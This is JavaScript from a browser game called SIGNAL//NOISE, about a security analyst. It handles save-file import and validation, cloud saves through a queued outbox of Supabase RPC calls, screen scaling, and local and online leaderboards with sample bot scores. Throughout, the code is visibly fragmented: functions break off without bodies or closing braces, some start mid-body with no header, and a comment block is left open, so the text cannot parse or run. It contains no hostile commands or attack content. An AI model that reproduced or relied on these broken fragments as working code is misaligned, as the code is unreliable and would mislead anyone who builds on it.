  const runTxt = r ? `<b>Career in progress</b> · seed <span class="mono">${esc(r.seed)}</span> · ${esc(TIERS[r.tier] || '?')} · ${r.shiftCount} shift(s) survived · ${r.phase === 'home' ? 'on days off' : r.shift ? 'during a ' + esc(r.shift.type.toLowerCase()) + ' shift (' + fmtClock(r.shift.base + r.shift.t) + ')' : ''}<br>Stress ${Math.round(r.stress)} · Reputation ${Math.round(r.rep)} · CP ${r.cp} · ${(r.cards || []).length} card(s)`
    : '<b>No run in progress</b> (profile only)';
  return `<p>Callsign: <b class="cy">${esc((m.profile && m.profile.name) || 'Analyst')}</b> · ${(m.history || []).length} past career(s) in history</p><p>${runTxt}</p><p>Profile: ${m.lp || 0} LP · ${Object.keys(m.unlocks || {}).length} unlock(s) · ${Object.keys(m.ach || {}).length} achievement(s) · best ${(m.best && m.best.shifts) || 0} shifts</p><p class="muted">Exported ${esc(when)}</p>`;
}
/** Validate and load a save file chosen by the player. */
function handleSaveFile(file) {
  if (!file) return;
  if (file.size > 5e6) { toast('That file is too large to be a profile file', 'bad'); return; }
  const fr = new FileReader();
  fr.onerror = () => toast('Could not read that file', 'bad');
  fr.onload = () => {
    let p;
    try { p = JSON.parse(fr.result); } catch (e) { modal({ title: 'NOT A PROFILE FILE', ico: '⚠', body: '<p>That file isn\'t valid JSON. Choose a <span class="mono">.json</span> profile downloaded from SIGNAL//NOISE.</p>' }); return; }
    if (!p || p.format !== SAVE_FORMAT || typeof p.meta !== 'object' || !p.meta) { modal({ title: 'NOT A PROFILE FILE', ico: '⚠', body: '<p>This JSON file wasn\'t created by SIGNAL//NOISE.</p>' }); return; }
    if (p.run && (typeof p.run !== 'object' || !p.run.seed || !p.run.schedule || !p.run.stats)) { modal({ title: 'DAMAGED SAVE', ico: '⚠', body: '<p>The run data in this file is incomplete and can\'t be loaded.</p>' }); return; }
    const ok = hashStr(JSON.stringify({ meta: p.meta, run: p.run || null })).toString(16) === p.checksum;
    const live = S.run && !S.run.ended;
    if (live) S.paused = true;
    modal({

function bindDragDrop() {

  document.addEventListener('dragenter', e => { if (!hasFiles(e)) return; e.preventDefault(); depth++; $('#dropHint').classList.remove('hidden'); });
  document.addEventListener('dragover', e => { if (!hasFiles(e)) return; e.preventDefault(); e.dataTransfer.dropEffect = 'copy'; });
  document.addEventListener('dragleave', e => { if (!hasFiles(e)) return; depth = Math.max(0, depth - 1); if (!depth) $('#dropHint').classList.add('hidden'); });

function fit() {
  const W = Math.max(200, window.innerWidth), H = Math.max(150, window.innerHeight);
  const pref = TEXT_SCALES[S.meta.settings.text] || 1;
  const mobile = W < 900 || H < 560;              // phones & small tablets get the touch layout
  let s;
  if (mobile) { s = clamp(Math.min(W / 420, H / 760), .78, 1.3) * pref; s = Math.min(s, W / 340, H / 380); }
  else { s = Math.min(W / DESIGN_W, H / DESIGN_H) * pref; s = Math.min(s, W / MIN_W, H / MIN_H); } // never squeeze below the minimum logical size
  S.mobile = mobile;
  const lw = W / s, lh = H / s, st = $('#stage');
  st.style.width = lw + 'px'; st.style.height = lh + 'px'; st.style.transform = `scale(${s})`;
  st.classList.toggle('narrow', lw < 1330);

  st.classList.toggle('short', mobile && lh < 560);
  st.classList.toggle('tiny', lw < 520);

  document.documentElement.style.setProperty('--sh', (lh / 100) + 'px');

}

  if (S.run && !S.run.ended) Store.set(SAVE_RUN, S.run);
  const run = getSavedRun(), m = Object.assign({}, S.meta); delete m.account; delete m.outbox;
  return { meta: m, run: run && !run.ended ? run : null, savedAt: new Date().toISOString() };
}
function queueOut(key, fn, args) {

}
/** Upload the whole profile (throttled to once a minute unless forced). */
function cloudSave(force) {

  const now = Date.now(), wait = 60000 - (now - (S._lastCloud || 0));
  if (!force && wait > 0) { if (!S._cloudT) S._cloudT = setTimeout(() => { S._cloudT = null; cloudSave(true); }, wait); return; }
  S._lastCloud = now; queueOut('save', 'sn_save', {}); flushOutbox();
}
function flushOutbox() {
  if (S._flushP) return S._flushP;
  const p = (async () => {
    await Promise.resolve(); // always yield first, so the busy flag below is set before we finish
    try {
      while ((S.meta.outbox || []).length && acct()) {
        const it = S.meta.outbox[0], args = Object.assign({ p_token: acct().token }, it.args);
        if (it.fn === 'sn_save') args.p_data = cloudPayload();
        try {
          await Net.rpc(it.fn, args);
          S.meta.outbox.shift(); if (it.fn === 'sn_save' && S.meta.account) S.meta.account.syncedAt = new Date().toISOString();
          Store.set(SAVE_META, S.meta);

      }

}
/** Live run total → Runs leaderboard (and Careers leaderboard once status is 'ended'). */

    acc: st.decisions ? Math.round(st.correct / st.decisions * 100) : 0, decisions: st.decisions, prevented: st.prevented,
    boss_won: st.bossWon, sla: st.sla, grade_pts: st.gradePts || 0, last_grade: (st.shiftGrades || []).slice(-1)[0] || null, started_at: r.startedAt };
}
/** Upload finished careers that never reached the leaderboard (played before accounts existed, or offline). */

  S.meta.history.forEach(h => {
    if (h.posted) return;
    const id = h.runId && /^[A-Za-z0-9_-]{6,32}$/.test(h.runId) ? h.runId : 'h' + hashStr((S.meta.profile.id || '') + '|' + (S.meta.profile.created || '') + '|' + (h.date || '') + '|' + (h.seed || '') + '|' + (h.shifts || 0)).toString(36).padStart(7, '0') + hashStr((h.date || '') + (S.meta.profile.id || '')).toString(36).slice(0, 5);
    queueOut('run:' + id, 'sn_post_run', { p_run: { id, diff: h.diff || 'standard', seed: h.seed, status: 'ended', cause: h.cause, shifts: h.shifts || 0, tier: h.tier || 0, acc: h.acc || 0,
      decisions: h.decisions || 0, prevented: h.prevented || 0, boss_won: h.bossWon || 0, sla: h.sla || 0, grade_pts: h.gradePts || 0,
      last_grade: (h.shiftGrades || []).slice(-1)[0] || null, started_at: h.date, ended_at: h.date } });
    h.posted = true; n++;
  });
  if (n) { Store.set(SAVE_META, S.meta); flushOutbox(); toast(`Posting ${n} earlier career${n === 1 ? '' : 's'} to the leaderboard`, 'good'); cloudSave(false); }
  return n;
}
function postRun(status, cause) {

  queueOut('run:' + S.run.runId, 'sn_post_run', { p_run: runPayload(status, cause) }); flushOutbox();

/* =====================================================================
   18f. LEADERBOARDS — Runs (live, every run) & Careers (finished runs)
   Online: Supabase sn_leaderboard, refreshed on open + every 30 s.
   Offline / not configured: sample bots (embedded) + this device's scores.

const LB_STORE = 'signalnoise.lb.v2';
const LB = { kind: 'runs', tab: 'all', cache: null, loading: false, err: null, timer: null, back: 'menu' };

  const n = (v, a, b) => clamp(Math.round(+v || 0), a, b);
  const out = { id: String(e.id || '').slice(0, 24), name: String(e.name || 'Analyst').replace(/[^\w .\-]/g, '').slice(0, 16), diff: DIFFS[e.diff] ? e.diff : 'standard',
    shifts: n(e.shifts, 0, 500), tier: n(e.tier, 0, 4), acc: n(e.acc, 0, 100), decisions: n(e.decisions, 0, 20000), prevented: n(e.prevented, 0, 5000),
    bossWon: n(e.bossWon, 0, 200), sla: n(e.sla, 0, 20000), gradePts: n(e.gradePts, 0, 50000), cause: ENDINGS[e.cause] ? e.cause : 'resigned', date: String(e.date || ''), bot: e.bot === true };
  out.score = careerScore(out); return out;
}
function lbSample() { try { const o = JSON.parse($('#official-leaderboard').textContent); return (o.entries || []).map(lbClean).filter(Boolean); } catch (e) { return []; } }
/** Offline rows: sample bots + this device's finished careers (+ current run on the Runs board). */
function lbLocalRows() {
  const me = profileName(), mine = S.meta.history.map(h => ({ name: me, diff: h.diff, shifts: h.shifts, tier: h.tier, acc: h.acc, prevented: h.prevented, status: 'ended', cause: h.cause, last_grade: (h.shiftGrades || []).slice(-1)[0], score: h.score || careerScore(h), updated_at: h.date, mine: true }));
  const live = lbCurrentRun(); if (LB.kind === 'runs' && live) mine.push(live);
  const bots = lbSample().map(b => ({ name: b.name, bot: true, diff: b.diff, shifts: b.shifts, tier: b.tier, acc: b.acc, prevented: b.prevented, status: 'ended', cause: b.cause, score: b.score, updated_at: b.date }));
  const pool = bots.concat(mine.filter(x => !x.mine || true)).filter(x => LB.tab === 'all' || x.diff === LB.tab);
  const best = {}; pool.forEach(x => { const k = x.mine ? '__me' : x.name; if (!best[k] || x.score > best[k].score) best[k] = x; });
  return Object.values(best).sort((a, b) => b.score - a.score).map((x, i) => Object.assign(x, { rank: i + 1 }));

/** The run in progress, scored with the same formula the server uses. */
function lbCurrentRun() {

  const st = r.stats, e = { diff: r.diff, shifts: r.shiftCount, tier: r.tier, acc: st.decisions ? Math.round(st.correct / st.decisions * 100) : 0, decisions: st.decisions, prevented: st.prevented, bossWon: st.bossWon, sla: st.sla, gradePts: st.gradePts || 0 };
  return { name: profileName(), diff: r.diff, shifts: r.shiftCount, tier: r.tier, acc: e.acc, prevented: st.prevented, status: 'active', score: careerScore(e), last_grade: (st.shiftGrades || []).slice(-1)[0], updated_at: new Date().toISOString(), mine: true, id: r.runId };
}
function lbKey() { return LB.kind + '|' + LB.tab; }
async function lbFetch(manual) {

function showLeaderboard(back) {

function tzName() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'local time'; } catch (e) { return 'local time'; } }

    <div class="lbname"><b>${esc(x.name)}</b> ${x.bot ? '<span class="tag carry" title="Sample score, not a real player">BOT</span>' : ''}${x.mine ? '<span class="tag watch">YOU</span>' : ''}${x.status === 'active' ? '<span class="tag livetag">● LIVE RUN</span>' : ''}
      <div class="qs">${D.ico} ${D.name} · ${x.shifts} shifts · ${esc(TIER_BADGE[x.tier] || '')} · ${x.acc}% acc${x.last_grade ? ` · last shift <b style="color:${GRADE_COLOR[x.last_grade]}">${x.last_grade}</b>` : ''}${x.status === 'ended' && ENDINGS[x.cause] ? ' · ' + ENDINGS[x.cause][0] + ' ' + ENDINGS[x.cause][1] : ''} · ${timeAgo(x.updated_at)}</div></div>
